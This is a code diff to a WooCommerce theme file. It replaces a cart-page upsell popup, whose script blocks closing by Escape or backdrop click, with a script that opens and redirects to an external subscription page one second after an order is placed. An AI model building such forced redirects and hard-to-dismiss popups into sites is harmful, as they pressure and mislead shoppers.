@@ -475,142 +475,18 @@ add_action("wp_footer", function () {
 // upsell
 
 add_action("wp_footer", function () {
-    if (!function_exists("wc") || is_admin() || !is_cart()) {
-        return;
+    if (
+        function_exists("is_wc_endpoint_url") &&
+        is_wc_endpoint_url("order-received") &&
+        !is_admin()
+    ) {
+        $targetUrl = "https://jbb.elms.pl/next/public/catalog/product/abonamentvip";
+        $u = esc_url($targetUrl);
+        $j = esc_js($targetUrl);
+        echo '<script>setTimeout(function(){try{window.open("' .
+            $j .
+            '","_blank");}catch(e){}try{window.location.href="' .
+            $j .
+            '";}catch(e){}},1000);</script>';
     }
-
-    $product_id = 4348;
-    $product = wc_get_product($product_id);
-    if (!$product || !$product->is_purchasable()) {
-        return;
-    }
-
-    $already_in_cart = false;
-    if (WC()->cart && !WC()->cart->is_empty()) {
-        foreach (WC()->cart->get_cart() as $cart_item) {
-            if ((int) $cart_item["product_id"] === (int) $product_id) {
-                $already_in_cart = true;
-                break;
-            }
-        }
-    }
-    if ($already_in_cart) {
-        return;
-    }
-
-    $title = $product->get_name();
-    $permalink = get_permalink($product_id);
-    $price_html = $product->get_price_html();
-    $thumb_id = $product->get_image_id();
-    $img_html = $thumb_id
-        ? wp_get_attachment_image($thumb_id, "full", false, [
-            "class" => "object-fit-contain",
-            "loading" => "lazy",
-            "decoding" => "async",
-            "alt" => esc_attr($title),
-        ])
-        : wc_placeholder_img("full");
-    $add_to_cart_url = esc_url(wc_get_cart_url() . "?add-to-cart=" . $product_id);
-    $modal_id = "ercoding-upsell-" . $product_id;
-    ?>
-    <div id="<?php echo esc_attr(
-        $modal_id,
-    ); ?>" style="display:none;" data-upsell="1" data-product-id="<?php echo esc_attr($product_id); ?>">
-        <div class="ercoding-upsell-modal" aria-labelledby="<?php echo esc_attr(
-            $modal_id,
-        ); ?>-title">
-            <li class="popular-products__item product">
-                <a href="<?php echo esc_url(
-                    $permalink,
-                ); ?>" class="woocommerce-LoopProduct-link woocommerce-loop-product__link woocommerce-loop-product__link--shorter" aria-label="<?php echo esc_attr($title); ?>">
-                    <div class="product__image"><?php echo $img_html; ?></div>
-                    <h2 id="<?php echo esc_attr(
-                        $modal_id,
-                    ); ?>-title" class="woocommerce-loop-product__title"><?php echo esc_html($title); ?></h2>
-                    <p class="price"><?php echo wp_kses_post($price_html); ?></p>
-                </a>
-                <div class="product__button-wrapper">
-                    <a href="<?php echo $add_to_cart_url; ?>" class="button product_type_simple add_to_cart_button" data-product_id="<?php echo esc_attr($product_id); ?>" rel="nofollow" aria-label="<?php echo esc_attr(sprintf(__("Dodaj do koszyka: „%s”", "woocommerce"), $title)); ?>"><?php echo esc_html__("Dodaj do koszyka", "woocommerce"); ?></a>
-                </div>
-            </li>
-        </div>
-    </div>
-    <script>
-    (function(){
-      var MODAL_ID = <?php echo json_encode("#" . $modal_id); ?>;
-      var STORAGE_KEY = 'ercoding_upsell_shown_<?php echo (int) $product_id; ?>';
-      var SHOW_DELAY_MS = 1000;
-
-      function fancyboxV4Ready(){return typeof window.Fancybox!=='undefined' && window.Fancybox && typeof window.Fancybox.show==='function';}
-      function fancyboxV3Ready(){return (window.jQuery && jQuery.fancybox && typeof jQuery.fancybox.open==='function');}
-
-      function markShown(){try{sessionStorage.setItem(STORAGE_KEY,'1');}catch(e){}}
-      function alreadyShown(){try{return sessionStorage.getItem(STORAGE_KEY)==='1';}catch(e){return false;}}
-
-      function blockBackdropAndEsc(){
-        function onDocClick(e){
-          var t=e.target;
-          if(!t) return;
-          if(t.classList && (t.classList.contains('fancybox__backdrop') || t.classList.contains('fancybox-bg'))) { e.stopImmediatePropagation(); e.preventDefault(); }
-          var p=t.closest ? t.closest('.fancybox__backdrop, .fancybox-bg') : null;
-          if(p){ e.stopImmediatePropagation(); e.preventDefault(); }
-        }
-        function onKey(e){
-          if(e.key==='Escape' || e.keyCode===27){ e.stopImmediatePropagation(); e.preventDefault(); }
-        }
-        document.addEventListener('click', onDocClick, true);
-        document.addEventListener('keydown', onKey, true);
-        return function cleanup(){
-          document.removeEventListener('click', onDocClick, true);
-          document.removeEventListener('keydown', onKey, true);
-        };
-      }
-
-      function bindMarking(){
-        var wrap=document.querySelector(MODAL_ID);
-        if(!wrap) return;
-        var productLink=wrap.querySelector('.woocommerce-LoopProduct-link');
-        if(productLink){ productLink.addEventListener('click', markShown, {once:true}); }
-        var addBtn=wrap.querySelector('.product__button-wrapper .add_to_cart_button');
-        if(addBtn){ addBtn.addEventListener('click', markShown, {once:true}); }
-        setTimeout(function(){
-          var closeBtn=document.querySelector('.fancybox__button--close,[data-fancybox-close],.fancybox-button--close');
-          if(closeBtn){ closeBtn.addEventListener('click', function(){ markShown(); }, {once:true}); }
-        }, 50);
-      }
-
-      function openModal(){
-        var cleanup=null;
-        if(fancyboxV4Ready()){
-          cleanup = blockBackdropAndEsc();
-          window.Fancybox.show([{ src: MODAL_ID, type: 'inline' }], {
-            dragToClose: false,
-            trapFocus: true,
-            placeFocusBack: true,
-            closeButton: "top"
-          });
-          bindMarking();
-          document.addEventListener('fzbxCleanup', function(){ if(cleanup) cleanup(); }, {once:true});
-          return true;
-        } else if(fancyboxV3Ready()){
-          cleanup = blockBackdropAndEsc();
-          jQuery.fancybox.open({ src: MODAL_ID, type: 'inline', opts: { buttons: ['close'], smallBtn: true, touch: false, clickOutside: false, clickSlide: false, keyboard: false } });
-          bindMarking();
-          jQuery(document).one('afterClose.fb', function(){ if(cleanup) cleanup(); });
-          return true;
-        }
-        return false;
-      }
-
-      function onReady(fn){ if(document.readyState==='complete'||document.readyState==='interactive'){ fn(); } else { document.addEventListener('DOMContentLoaded', fn, {once:true}); } }
-
-      onReady(function(){
-        if(alreadyShown()) return;
-        if(!document.body || !document.body.classList.contains('woocommerce-cart')) return;
-        if(!document.querySelector(MODAL_ID)) return;
-        setTimeout(function(){ openModal(); }, SHOW_DELAY_MS);
-      });
-    })();
-    </script>
-    <?php
 });
